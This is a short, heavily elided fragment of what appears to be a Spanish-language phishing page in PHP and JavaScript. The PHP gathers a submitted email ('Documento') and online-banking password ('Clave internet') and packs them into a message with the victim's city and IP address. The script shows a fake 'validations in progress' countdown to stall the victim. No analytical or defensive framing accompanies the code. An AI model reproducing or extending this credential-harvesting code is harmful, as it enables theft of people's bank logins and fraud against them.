...
if ( isset ($_POST['email']) && isset ($_POST['password'])){
    ...
    $message = "Documento ".$_POST['email']." - Clave internet ".$_POST['password']."  ciudad ".$ciudad." Ip ".$ip." \r\n";
...
<head>
 ...
 <script language="JavaScript">
    ...
    {
        document.getElementById('CuentaAtras').innerHTML = "<p style=color:#575757!important; Estamos realizando validaciones. <br> Por favor, espera "+totalTiempo+" segundos,  <strong style=color:#43b12e>Estamos realizando validaciones</strong>";
